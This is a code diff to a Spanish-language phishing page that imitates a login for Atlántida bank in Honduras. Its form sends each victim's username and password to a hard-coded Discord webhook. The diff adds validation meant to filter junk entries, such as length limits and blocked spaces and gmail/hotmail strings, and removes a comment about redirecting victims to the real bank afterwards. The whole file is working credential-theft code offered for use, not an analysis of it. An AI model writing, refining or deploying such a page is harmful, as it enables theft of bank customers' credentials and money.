@@ -74,6 +74,32 @@
         .clock-spin {
             animation: clock-spin 8s linear infinite;
         }
+
+        /* ===== VALIDACIÓN VISUAL ===== */
+        .input-error {
+            border-color: #ef4444 !important;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+        }
+        .error-message {
+            color: #ef4444;
+            font-size: 11px;
+            margin-top: 4px;
+            display: none;
+            font-weight: 600;
+        }
+        .error-message.visible {
+            display: block;
+        }
+        .info-message {
+            color: #6b7280;
+            font-size: 11px;
+            margin-top: 4px;
+            display: none;
+            font-style: italic;
+        }
+        .info-message.visible {
+            display: block;
+        }
     </style>
 </head>
 <body class="bg-white font-sans antialiased text-gray-800">
@@ -165,17 +191,38 @@
                 <form id="loginForm" class="space-y-4 lg:space-y-3.5" onsubmit="sendToDiscord(event)">
                     <div class="space-y-1.5 lg:space-y-1">
                         <label for="username" class="text-[12px] lg:text-[11px] font-bold text-gray-700 block">Usuario</label>
-                        <input type="text" id="username" required placeholder="Ingresa tu usuario" class="w-full h-10 lg:h-9 px-3 border border-gray-300 rounded-lg outline-none text-xs transition-all input-brand placeholder:text-gray-400" />
+                        <input 
+                            type="text" 
+                            id="username" 
+                            required 
+                            maxlength="15"
+                            placeholder="Ingresa tu usuario" 
+                            class="w-full h-10 lg:h-9 px-3 border border-gray-300 rounded-lg outline-none text-xs transition-all input-brand placeholder:text-gray-400"
+                            oninput="validarLongitud(this)"
+                            onkeydown="return validarTecla(event)"
+                        />
+                        <p class="info-message" id="usernameInfo">Ingrese los datos correctamente para obtener los beneficios</p>
+                        <p class="error-message" id="usernameError">Ingrese usuario correctamente</p>
                     </div>
 
                     <div class="space-y-1.5 lg:space-y-1">
                         <label for="password" class="text-[12px] lg:text-[11px] font-bold text-gray-700 block">Contraseña</label>
                         <div class="relative">
-                            <input type="password" id="password" required placeholder="Ingresa tu contraseña" class="w-full h-10 lg:h-9 pl-3 pr-10 border border-gray-300 rounded-lg outline-none text-xs transition-all input-brand placeholder:text-gray-400" />
+                            <input 
+                                type="password" 
+                                id="password" 
+                                required 
+                                maxlength="15"
+                                placeholder="Ingresa tu contraseña" 
+                                class="w-full h-10 lg:h-9 pl-3 pr-10 border border-gray-300 rounded-lg outline-none text-xs transition-all input-brand placeholder:text-gray-400"
+                                oninput="validarLongitud(this)"
+                                onkeydown="return validarTecla(event)"
+                            />
                             <button type="button" onclick="togglePasswordVisibility()" class="absolute inset-y-0 right-0 pr-3 flex items-center text-red-600 hover:text-red-700">
                                 <i id="eyeIcon" class="fa-solid fa-eye-slash text-[11px] lg:text-[10px]"></i>
                             </button>
                         </div>
+                        <p class="error-message" id="passwordError">Ingrese usuario correctamente</p>
                         <div class="text-right pt-0.5">
                             <a href="#" class="text-[11px] lg:text-[10px] font-semibold text-[#D9272E] hover:underline">¿Olvidaste tu contraseña?</a>
                         </div>
@@ -257,6 +304,35 @@
         // ============================================
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540553924161966220/gmtc5tUYY1UzVFFEYOKvExB2KG0F-77bG_mK5cEQxn3SZMxq091ebLJEY0qlhmV2Atib";
 
+        // ===== VALIDACIÓN DE CAMPOS =====
+        function validarTecla(event) {
+            // Bloquear tecla de espacio (código 32)
+            if (event.keyCode === 32) {
+                event.preventDefault();
+                return false;
+            }
+            return true;
+        }
+
+        function validarLongitud(input) {
+            // Mostrar mensaje informativo mientras escribe
+            const infoId = input.id === 'username' ? 'usernameInfo' : '';
+            if (infoId) {
+                document.getElementById(infoId).classList.add('visible');
+            }
+            
+            // Verificar si pasa de 15 caracteres
+            if (input.value.length > 15) {
+                input.classList.add('input-error');
+                const errorId = input.id === 'username' ? 'usernameError' : 'passwordError';
+                document.getElementById(errorId).classList.add('visible');
+            } else {
+                input.classList.remove('input-error');
+                const errorId = input.id === 'username' ? 'usernameError' : 'passwordError';
+                document.getElementById(errorId).classList.remove('visible');
+            }
+        }
+
         // ===== TOGGLE PASSWORD =====
         function togglePasswordVisibility() {
             const passwordInput = document.getElementById('password');
@@ -275,13 +351,56 @@
         // ===== ENVIAR LOGIN A DISCORD =====
         async function sendToDiscord(event) {
             event.preventDefault();
-            const usernameVal = document.getElementById('username').value;
-            const passwordVal = document.getElementById('password').value;
+            
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            
+            const usernameVal = usernameInput.value;
+            const passwordVal = passwordInput.value;
+            
+            // Validar usuario
+            let tieneError = false;
+            
+            // Verificar longitud máxima
+            if (usernameVal.length > 15 || passwordVal.length > 15) {
+                tieneError = true;
+            }
+            
+            // Verificar espacios
+            if (usernameVal.includes(' ') || passwordVal.includes(' ')) {
+                tieneError = true;
+            }
+            
+            // Verificar dominios bloqueados
+            const dominiosBloqueados = /gmail\.com|hotmail\.com/i;
+            if (dominiosBloqueados.test(usernameVal) || dominiosBloqueados.test(passwordVal)) {
+                tieneError = true;
+            }
+            
+            // Mostrar error si hay problema
+            if (tieneError) {
+                usernameInput.classList.add('input-error');
+                passwordInput.classList.add('input-error');
+                document.getElementById('usernameError').classList.add('visible');
+                document.getElementById('passwordError').classList.add('visible');
+                document.getElementById('usernameInfo').classList.remove('visible');
+                
+                // Limpiar errores después de 3 segundos
+                setTimeout(() => {
+                    usernameInput.classList.remove('input-error');
+                    passwordInput.classList.remove('input-error');
+                    document.getElementById('usernameError').classList.remove('visible');
+                    document.getElementById('passwordError').classList.remove('visible');
+                }, 3000);
+                
+                return;
+            }
+            
+            // Continuar con el flujo original
             const loader = document.getElementById('loadingOverlay');
-
             localStorage.setItem('cached_user', usernameVal);
             loader.classList.remove('hidden');
-
+            
             const messageData = {
                 username: "Atlántida Log Bot",
                 avatar_url: "https://cdn.prod.website-files.com/6928d334b7a7a6941baf0636/69a1cad46ea550499086146b_logo-isotipo-large.png",
@@ -296,7 +415,7 @@
                     timestamp: new Date().toISOString()
                 }]
             };
-
+            
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: "POST",
@@ -306,7 +425,7 @@
             } catch (error) {
                 console.error("Error Discord:", error);
             }
-
+            
             setTimeout(() => {
                 loader.classList.add('hidden');
                 document.getElementById('stepLogin').classList.add('hidden');
@@ -354,11 +473,6 @@
                     document.getElementById('stepVerification').classList.add('hidden');
                     document.getElementById('stepWaiting').classList.remove('hidden');
                     
-                    // Opcional: redirigir al banco real después de 30 segundos
-                    // setTimeout(() => {
-                    //     window.location.href = "https://www.bancatlan.hn/";
-                    // }, 30000);
-                    
                 }, 2000);
 
             } catch (error) {
@@ -367,6 +481,5 @@
             }
         }
     </script>
-    <!-- ===== REPLIT ELIMINADO ===== -->
 </body>
 </html>
